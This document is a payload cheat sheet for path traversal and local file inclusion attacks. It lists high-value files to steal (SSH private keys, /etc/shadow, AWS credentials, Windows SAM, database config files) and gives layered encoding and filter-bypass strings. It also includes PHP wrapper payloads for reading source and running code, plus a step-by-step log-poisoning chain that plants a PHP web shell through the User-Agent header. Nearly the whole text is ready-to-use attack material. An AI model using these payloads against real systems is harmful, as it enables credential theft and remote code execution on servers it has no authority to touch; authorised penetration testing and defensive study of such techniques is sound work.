# Path Traversal Payloads & Techniques

## OS-Specific File Targets

### Linux/Unix Priority Files (Ordered by Impact)
```
/etc/passwd                          → User enumeration (always readable, good baseline test)
/etc/hostname                        → Server hostname
/etc/issue, /etc/os-release          → OS version
/proc/self/environ                   → Environment variables (CRITICAL — may contain secrets)
/proc/self/cmdline                   → Process command line
/proc/self/status                    → Process info (uid, memory)
/proc/version                        → Kernel version
/proc/net/tcp                        → Open TCP ports (internal port scan via file read)
/proc/net/arp                        → Local network info
/var/log/apache2/access.log          → Web server access log (target for log poisoning)
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/home/{USER}/.ssh/id_rsa             → SSH private key (CRITICAL if readable)
/home/{USER}/.ssh/authorized_keys
/home/{USER}/.bash_history           → Command history
/home/{USER}/.mysql_history          → MySQL command history
/root/.ssh/id_rsa                    → Root SSH (requires root read access)
/etc/shadow                          → Password hashes (requires root)
/etc/crontab                         → Cron jobs
/etc/passwd-                         → Backup file
/etc/hosts                           → Internal hostname resolution
/etc/resolv.conf                     → DNS config
```

### Application Config Files (Language-Specific)
```
PHP:
/var/www/html/wp-config.php          → WordPress DB creds
/var/www/html/configuration.php      → Joomla config
/var/www/html/.env                   → Environment file (Laravel, generic)
/var/www/html/config.php

Java:
/opt/tomcat/conf/server.xml          → Tomcat config
/opt/tomcat/conf/context.xml         → JNDI datasource (often contains DB creds)
/opt/tomcat/conf/tomcat-users.xml    → Tomcat user credentials
WEB-INF/web.xml                      → Java webapp config

Node.js:
/opt/app/.env
/opt/app/config/default.json
/opt/app/ecosystem.config.js         → PM2 config with env vars

Python:
/opt/app/settings.py                 → Django settings
/opt/app/.env
/opt/app/instance/config.py          → Flask instance config

Ruby:
/opt/app/config/database.yml         → Rails DB config
/opt/app/config/secrets.yml          → Rails secrets
/opt/app/config/master.key           → Rails encrypted credentials key
```

### Windows Priority Files
```
C:\Windows\System32\drivers\etc\hosts    → Hosts file (always readable)
C:\Windows\win.ini                       → Windows init file
C:\Windows\System32\inetsrv\MetaBase.xml → IIS metabase
C:\inetpub\wwwroot\web.config            → IIS/ASP.NET config
C:\Users\{USER}\.ssh\id_rsa              → SSH keys on Windows
C:\Users\{USER}\.aws\credentials         → AWS credentials
C:\Windows\repair\SAM                    → SAM database backup
C:\Windows\System32\config\SAM           → Current SAM (usually locked)
```

## Encoding Chains (Apply Progressively)

### Level 1: Basic
```
../../../etc/passwd
```

### Level 2: URL Encoding
```
..%2f..%2f..%2fetc%2fpasswd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Level 3: Double URL Encoding
```
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Level 4: Unicode / UTF-8 Overlong
```
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### Level 5: Mixed Slashes (Windows)
```
..\..\..\etc\passwd
..%5c..%5c..%5cetc%5cpasswd
..\%2f..\%2fetc\%2fpasswd
```

### Level 6: Bypass Patterns
```
# Double-dot stripping bypass
....//....//....//etc/passwd
....\/....\/....\/etc\/passwd

# Semicolon bypass (Java/Tomcat)
..;/..;/..;/etc/passwd

# Null byte (older systems with string termination)
../../../etc/passwd%00
../../../etc/passwd%00.png
../../../etc/passwd\0

# Path normalization bypass
/..%00/..%00/etc/passwd
%5C..%5C..%5Cetc%5Cpasswd
```

## PHP Wrappers (PHP-Specific LFI)

### Source Code Read
```
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=/var/www/html/config
php://filter/read=string.rot13/resource=admin
```
Returns base64-encoded source code. Decode with `base64 -d`.

### Code Execution
```
# POST body execution
php://input
# (Send PHP code in POST body)

# Base64 code execution
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# Expect protocol (if enabled)
expect://id
```

### Log Poisoning to RCE Chain
```
Step 1: Inject PHP via User-Agent header:
  User-Agent: <?php system($_GET['cmd']); ?>
  → Gets written to /var/log/apache2/access.log

Step 2: Include the log file:
  ?page=../../../../var/log/apache2/access.log&cmd=id
  → PHP in User-Agent is evaluated, $_GET['cmd'] executes
```

## Path Truncation (Bypass Extension Append)

Older PHP versions truncate long paths at 4096 bytes:
```
../../../etc/passwd/./././././././[repeat ./ 2000+ times]
../../../etc/passwd[repeat 2000 times of .]
```
The OS truncates the path, removing the `.php` the application appended.
